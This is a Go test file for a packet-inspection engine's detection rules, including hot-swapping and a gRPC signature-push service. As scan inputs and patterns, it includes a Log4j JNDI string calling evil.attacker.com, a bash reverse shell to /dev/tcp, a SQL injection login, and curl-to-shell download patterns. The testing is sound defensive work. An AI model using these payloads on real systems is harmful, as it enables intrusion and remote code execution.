package dpi

import (
	"context"
	"fmt"
	"net"
	"sync"
	"testing"
	"time"

	managementproto "github.com/copsec/collector/proto/management"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
)

func TestDynamicEngineCompilationAndMatching(t *testing.T) {
	initialRules := []Rule{
		{
			ID:       "CVE-2021-44228",
			Name:     "Log4j JNDI Exploit",
			Pattern:  "${jndi:ldap://",
			Category: CategoryRCEDeserialization,
			Severity: "CRITICAL",
		},
		{
			ID:       "SQLI_UNION",
			Name:     "Union Select Attack",
			Pattern:  "UNION SELECT",
			Category: CategorySQLInjection,
			Severity: "HIGH",
		},
	}

	engine := NewDynamicEngine(initialRules)
	if engine.RuleCount() != 2 {
		t.Fatalf("Expected 2 rules, got %d", engine.RuleCount())
	}
	if engine.Version() != 1 {
		t.Fatalf("Expected version 1, got %d", engine.Version())
	}

	// Positive match
	payload := []byte("GET /search?q=${jndi:ldap://evil.attacker.com/a} HTTP/1.1\r\n\r\n")
	res, matched := engine.Scan(payload)
	if !matched {
		t.Fatal("Expected match for Log4j payload")
	}
	if res.RuleID != "CVE-2021-44228" {
		t.Fatalf("Expected CVE-2021-44228, got %s", res.RuleID)
	}

	// Negative match
	safePayload := []byte("GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n")
	_, matched = engine.Scan(safePayload)
	if matched {
		t.Fatal("Expected safe payload not to match any rules")
	}
}

func TestDynamicEngineConcurrentHotSwapAndScanRace(t *testing.T) {
	engine := NewDynamicEngine(GetEmbeddedSignatures())

	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()

	var wg sync.WaitGroup

	// Reader goroutines continuously scanning
	for i := 0; i < 8; i++ {
		wg.Add(1)
		go func(readerID int) {
			defer wg.Done()
			payload1 := []byte("GET /?x=() { :;}; /bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1")
			payload2 := []byte("POST /login HTTP/1.1\r\n\r\nuser=admin' OR 1=1--")
			payloadSafe := []byte("GET /static/styles.css HTTP/1.1\r\nHost: cdn.internal\r\n\r\n")

			for {
				select {
				case <-ctx.Done():
					return
				default:
					_, _ = engine.Scan(payload1)
					_, _ = engine.Scan(payload2)
					_, _ = engine.Scan(payloadSafe)
					_ = engine.ScanAll(payload1)
					_ = engine.GetRules()
				}
			}
		}(i)
	}

	// Writer goroutines continuously hot-swapping rulesets
	for i := 0; i < 3; i++ {
		wg.Add(1)
		go func(writerID int) {
			defer wg.Done()
			iteration := 0
			for {
				select {
				case <-ctx.Done():
					return
				default:
					iteration++
					newRule := Rule{
						ID:       fmt.Sprintf("DYNAMIC_CVE_%d_%d", writerID, iteration),
						Name:     "Dynamic Test CVE Pattern",
						Pattern:  fmt.Sprintf("attack_pattern_%d_%d", writerID, iteration),
						Category: CategoryCommandInjection,
						Severity: "HIGH",
					}
					rules := append(GetEmbeddedSignatures(), newRule)
					_ = engine.HotSwapRules(rules)
					time.Sleep(10 * time.Millisecond)
				}
			}
		}(i)
	}

	wg.Wait()

	if engine.SwapCount() == 0 {
		t.Fatal("Expected swap count > 0")
	}
}

func TestDynamicEngineRawPatternsAndJSON(t *testing.T) {
	engine := NewDynamicEngine(nil)

	// HotSwapRawPatterns
	patterns := []string{
		"cve-2024-test-1",
		"curl -s http://malicious.domain/payload.sh",
		"base64 -d | sh",
	}
	if err := engine.HotSwapRawPatterns(patterns, CategoryCommandInjection, "CRITICAL"); err != nil {
		t.Fatalf("HotSwapRawPatterns failed: %v", err)
	}

	if engine.RuleCount() != 3 {
		t.Fatalf("Expected 3 rules, got %d", engine.RuleCount())
	}

	match, ok := engine.Scan([]byte("user running: base64 -d | sh now"))
	if !ok || match.MatchedPattern != "base64 -d | sh" {
		t.Fatalf("Expected match on base64, got ok=%v match=%+v", ok, match)
	}

	// HotSwapFromJSON
	jsonBundle := []byte(`[
		{"id": "JSON_01", "name": "JSON Test Rule 1", "pattern": "secret_exploit_token", "category": "RCE_DESERIALIZATION", "severity": "CRITICAL"},
		{"id": "JSON_02", "name": "JSON Test Rule 2", "pattern": "arbitrary_write_call", "category": "COMMAND_INJECTION", "severity": "HIGH"}
	]`)

	if err := engine.HotSwapFromJSON(jsonBundle); err != nil {
		t.Fatalf("HotSwapFromJSON failed: %v", err)
	}

	if engine.RuleCount() != 2 {
		t.Fatalf("Expected 2 rules after JSON swap, got %d", engine.RuleCount())
	}

	match, ok = engine.Scan([]byte("trigger secret_exploit_token payload"))
	if !ok || match.RuleID != "JSON_01" {
		t.Fatalf("Expected JSON_01 match, got ok=%v match=%+v", ok, match)
	}
}

func TestManagementServerPushSignatures(t *testing.T) {
	engine := NewDynamicEngine(nil)

	lis, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("Failed to create listener: %v", err)
	}
	defer lis.Close()

	grpcServer, err := StartManagementServer(lis, engine)
	if err != nil {
		t.Fatalf("Failed to start management server: %v", err)
	}
	defer grpcServer.Stop()

	// Dial with gRPC client simulating pardus1
	conn, err := grpc.NewClient(lis.Addr().String(), grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		t.Fatalf("Failed to dial management endpoint: %v", err)
	}
	defer conn.Close()

	client := managementproto.NewSensorManagementServiceClient(conn)

	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()

	// Push updated bundle from "pardus1"
	bundle := &managementproto.SignatureBundle{
		BundleId:      "bundle-20260911-prod",
		BundleVersion: "2.4.0",
		PushedBy:      "pardus1",
		TimestampMs:   time.Now().UnixMilli(),
		Rules: []*managementproto.SignatureRule{
			{
				Id:       "CVE-2026-9999",
				Name:     "Zero-Day Edge Bypass Exploit",
				Pattern:  "copsec_bypass_token_0day",
				Category: "CUSTOM_ZERO_DAY",
				Severity: "CRITICAL",
			},
			{
				Id:       "CVE-2026-8888",
				Name:     "Memory Overflow Probe",
				Pattern:  "heap_spray_overflow_magic",
				Category: "RCE_DESERIALIZATION",
				Severity: "HIGH",
			},
		},
	}

	resp, err := client.PushSignatures(ctx, bundle)
	if err != nil {
		t.Fatalf("PushSignatures failed: %v", err)
	}
	if !resp.Success {
		t.Fatalf("PushSignatures reported failure: %s", resp.Message)
	}
	if resp.RulesLoaded != 2 {
		t.Fatalf("Expected 2 rules loaded, got %d", resp.RulesLoaded)
	}

	// Verify sensor engine status
	status, err := client.GetEngineStatus(ctx, &managementproto.EngineStatusRequest{RequesterId: "pardus1"})
	if err != nil {
		t.Fatalf("GetEngineStatus failed: %v", err)
	}
	if status.ActiveRulesCount != 2 {
		t.Fatalf("Expected active rules count 2, got %d", status.ActiveRulesCount)
	}
	if status.TotalSwaps == 0 {
		t.Fatal("Expected total swaps > 0")
	}

	// Verify the engine immediately detects the pushed signature without restart
	verdict, matched := engine.Scan([]byte("incoming attack with copsec_bypass_token_0day in headers"))
	if !matched {
		t.Fatal("Expected pushed zero-day signature to be detected")
	}
	if verdict.RuleID != "CVE-2026-9999" {
		t.Fatalf("Expected rule ID CVE-2026-9999, got %s", verdict.RuleID)
	}
}
